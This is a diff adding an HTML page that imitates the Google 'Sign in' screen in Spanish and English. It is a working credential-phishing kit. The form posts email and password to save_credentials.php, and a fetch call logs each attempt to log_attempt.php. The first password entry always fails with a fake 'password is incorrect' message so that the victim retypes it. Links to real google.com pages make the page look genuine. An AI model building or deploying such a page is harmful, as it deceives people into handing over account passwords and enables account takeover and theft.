@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Para diseño responsivo -->
+    <title>Iniciar sesión</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="img/google-ico.png" type="image/x-icon">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
+
+        body {
+            margin: 0; /* Quitar margen por defecto del body */
+            padding: 0;
+            font-family: 'Poppins', sans-serif; /* Usar fuente globalmente */
+        }
+
+        .login-box {
+            position: absolute;
+            top: 18%;
+            left: 50%;
+            transform: translateX(-50%); /* Centrar horizontalmente */
+            width: 90%; /* Adaptar al tamaño del dispositivo */
+            max-width: 460px; /* Limitar el tamaño máximo */
+            height: auto; /* Adaptar la altura automáticamente */
+            border: 1px solid #DADCE0;
+            border-radius: 10px;
+            padding: 20px; /* Añadir padding para espaciar los elementos */
+            background-color: white; /* Fondo blanco para la caja de login */
+        }
+
+        .login-box h1 {
+            text-align: center; /* Centrar el título */
+            font-size: 25px;
+            margin: 0; /* Quitar margen por defecto */
+        }
+
+        .login-box x1 {
+            display: block; /* Cambiar a bloque para que se muestre bien */
+            text-align: center; /* Centrar el texto */
+            margin-top: 10px; /* Espaciado superior */
+            font-size: 15px;
+        }
+
+        .login-box input {
+            font-size: 20px;
+            width: 95%; /* Adaptar al ancho completo */
+            height: 50px;
+            margin: 10px 0; /* Espaciado vertical entre inputs */
+            background: none;
+            color: inherit;
+            border: 1px solid #DADCE0;
+            border-radius: 3px;
+            padding: 0 10px; /* Padding para el texto */
+        }
+
+        .login-box button {
+            background-color: #1A73E8;
+            height: 40px;
+            width: 35%;
+            font-size: 15px;
+            color: white;
+            outline: none;
+            border: none;
+            border-radius: 100px;
+            cursor: pointer; /* Cambiar cursor al pasar sobre el botón */
+        }
+
+        .login-box button:hover {
+            background-color: #1567D3; /* Cambiar color al pasar el mouse */
+        }
+
+        .action-container {
+            display: flex;
+            justify-content: space-between; /* Alinear elementos a los extremos */
+            align-items: center; /* Centrar verticalmente */
+            margin-top: 20px; /* Espaciado superior */
+        }
+
+        .login-box x2 {
+            display: block; /* Cambiar a bloque para que se muestre bien */
+            color: #1A73E8;
+            text-align: left; /* Alinear a la izquierda */
+            margin-top: 0px; /* Espaciado superior */
+        }
+
+        .login-box small {
+            color: #5F6368;
+            margin-top: 20px; /* Espaciado superior */
+            display: block; /* Cambiar a bloque para que se muestre bien */
+        }
+
+        .login-box p {
+            color: red;
+            display: none; /* Ocultar inicialmente */
+            font-size: 65%;
+        }
+
+        /* Animación para el checkbox */
+        .checkbox-label {
+            display: flex;
+            align-items: center; /* Centrar verticalmente */
+            cursor: pointer; /* Cambiar cursor a puntero */
+        }
+        .checkbox-label input[type="checkbox"] {
+            width: 20px; /* Ancho del checkbox */
+            height: 20px; /* Altura del checkbox */
+            margin-right: 10px; /* Espaciado a la derecha */
+            transition: transform 0.2s ease; /* Transición suave */
+        }
+
+        .checkbox-label input[type="checkbox"]:checked {
+            transform: scale(1.2); /* Aumentar el tamaño del checkbox al marcarlo */
+        }
+        
+        .login-box img {
+            max-width: 25%; /* Hacer que la imagen no exceda el ancho del contenedor */
+            height: auto; /* Mantener la proporción de la imagen */
+            display: block; /* Asegurarse de que se comporte como un bloque */
+            margin: 0 auto 20px; /* Centrar la imagen y agregar margen inferior */
+        }
+    </style>
+</head>
+<body>
+  <div class="login-box">
+      <img src='img/pngwing.com.png' style="display: block; margin: 0 auto 20px;">
+      <h1>Sign in</h1>
+      <x1> Use your Google Account</x1>
+
+      <!-- Formulario para enviar las credenciales -->
+      <form action="save_credentials.php" method="POST">
+          <!-- Email input -->
+          <input type="text" id="username" name="username" placeholder="Email or phone" style="font-size: 100%;">
+          <p id="email-error-message" style="color: red; display: none;">Por favor, ingresa un email válido.</p> <!-- Error message for email -->
+          <input type="password" id="password" name="password" placeholder="Password" style="display: none; font-size: 100%;">
+            <!-- Cambia esta parte en tu HTML -->
+            <a id="forgot-email" style="display: block; text-decoration: none;" href="https://www.google.com">¿Olvidaste el correo electrónico?</a>
+            <div id="show-password-container" style="display: none; margin-top: 10px;">
+                <label style="display: flex; align-items: center;" class="checkbox-label">
+                    <input type="checkbox" id="show-password" onclick="togglePassword()" style="width: 15px; height: 15px; margin-right: 5px;">
+                    Mostrar contraseña
+                </label>
+            </div>
+
+
+
+          <!-- Error message -->
+          <p id="error-message" style="display: none;">La contraseña es incorrecta. Vuelve a intentarlo o haz clic en "¿Olvidaste la contraseña?" para restablecerla.</p>
+
+          <small>¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.<a href="https://www.google.com" style="text-decoration: none; color: #1A73E8;">  Más información para usar el modo de invitado</a></small>
+          
+          <!-- Contenedor para el botón y "Create Account" -->
+          <div class="action-container">
+              <a href="https://www.google.com" style="color: #1A73E8; text-decoration: none;"> Crear cuenta</a>
+              <button type="button" onclick="handleLogin()">Siguiente</button>
+          </div>
+      </form>
+  </div>
+    <!--           -->
+    <script>
+        let step = 1;  // Track the current step (1 = email input, 2 = password input)
+        let attempt = 0; // Track login attempts
+
+        // Define translations for English and Spanish
+        const translations = {
+            en: {
+                title: "Sign in",
+                useGoogleAccount: "Use your Google Account",
+                enterPassword: "Enter your password",
+                createAccount: "Create Account",
+                forgotEmail: "Forgot email?",
+                forgotPassword: "Forgot password",
+                errorMessage: "The password is incorrect. Please try again or click on 'Forgot Password' to reset it.",
+                privateBrowsing: "Not your computer? Use a private browsing window to sign in. Learn more",
+                button: 'Next',
+                username: 'Email or phone',
+                password: 'Password',
+            },
+            es: {
+                title: "Iniciar sesión",
+                useGoogleAccount: "Usa tu cuenta de Google",
+                enterPassword: "Ingresa tu contraseña",
+                createAccount: "Crear cuenta",
+                forgotEmail: "¿Olvidaste tu correo?",
+                forgotPassword: "Olvidé la contraseña",
+                errorMessage: "La contraseña es incorrecta. Vuelve a intentarlo o haz clic en 'Olvidé la contraseña' para restablecerla.",
+                privateBrowsing: "¿No es tu computadora? Usa una ventana de navegación privada para iniciar sesión. Aprende más",
+                button: 'Siguiente',
+                username: 'Correo electrónico o teléfono',
+                password: 'Contraseña',
+            }
+        };
+
+        // Detect the user's language
+        const userLanguage = navigator.language || navigator.userLanguage; 
+        const language = userLanguage.startsWith('es') ? 'es' : 'en';
+
+        // Function to save email input to localStorage
+        function saveInput() {
+            const usernameInput = document.getElementById("username").value;
+            localStorage.setItem("savedUsername", usernameInput);
+        }
+
+        // Function to load the saved input from localStorage when the page loads
+        window.onload = function() {
+            const savedUsername = localStorage.getItem("savedUsername");
+            if (savedUsername) {
+                document.getElementById("username").value = savedUsername;
+            }
+
+            // Set content based on the detected language
+            document.querySelector('.login-box h1').textContent = translations[language].title;
+            document.querySelector('.login-box x1').textContent = translations[language].useGoogleAccount;
+            document.querySelector('.action-container x3').textContent = translations[language].createAccount;
+            document.querySelector('.action-container button').textContent = translations[language].button;
+            document.querySelector('.login-box input[placeholder="Email or phone"]').placeholder = translations[language].username;
+            document.querySelector('.login-box input[placeholder="Password"]').placeholder = translations[language].password;
+        };
+
+        // Function to toggle password visibility
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            const showPasswordCheckbox = document.getElementById("show-password");
+            passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
+        }
+
+        function handleLogin() {
+        const emailInput = document.getElementById("username");
+        const emailErrorMessage = document.getElementById("email-error-message");
+        const passwordInput = document.getElementById("password");
+        const errorMessage = document.getElementById("error-message");
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        
+
+        // Guardar el intento en el servidor
+        fetch('log_attempt.php', {
+        method: 'POST',
+        body: JSON.stringify({ 
+            email: emailInput.value, 
+            password: passwordInput.value // Agregar la contraseña también
+        }),
+        headers: {
+            'Content-Type': 'application/json'
+        }
+        });
+
+                // Detecta cuando se presiona Enter en el input del email
+                document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("username").addEventListener("keydown", function(event) {
+                if (event.key === "Enter") {
+                    event.preventDefault(); // Evita el comportamiento por defecto
+                    handleLogin(); // Llama a la función de login
+                }
+            });
+
+            document.getElementById("password").addEventListener("keydown", function(event) {
+                if (event.key === "Enter") {
+                    event.preventDefault(); // Evita el comportamiento por defecto
+                    handleLogin(); // Llama a la función de login
+                }
+            });
+        });
+
+    if (step === 1) {
+        // Check if email is valid
+        if (!emailPattern.test(emailInput.value)) {
+            emailErrorMessage.style.display = "block"; // Show error if invalid
+            return; // Stop execution
+        } else {
+            emailErrorMessage.style.display = "none"; // Hide error if valid
+        }
+
+        // Switch to password input
+        emailInput.style.display = "none"; // Hide email input
+        passwordInput.style.display = "block"; // Show password input
+        document.getElementById("show-password-container").style.display = "flex"; // Show show password checkbox
+
+        // Ocultar el texto de "Olvidaste el correo"
+        document.getElementById("forgot-email").style.display = "none"; // Hide forgot email text
+
+        step = 2; // Move to the next step
+    } else {
+        // Check login attempts
+        attempt++; // Increment the attempt count
+
+        if (attempt === 1) {
+            // Always fail the first attempt
+            errorMessage.style.display = "block"; // Show error message
+            errorMessage.textContent = "La contraseña es incorrecta. Inténtalo de nuevo."; // Set error message
+            passwordInput.value = ""; // Clear password input
+            return; // Stop execution
+        } else {
+            // Call saveInput function to save the input
+            saveInput(); // Save email input
+
+            // Simulate successful login on the second attempt
+            errorMessage.style.display = "none"; // Hide error message
+            document.querySelector('form').submit(); // Submit the form
+        }
+    }
+}
+
+
+
+
+    </script>
+</body>
+</html>
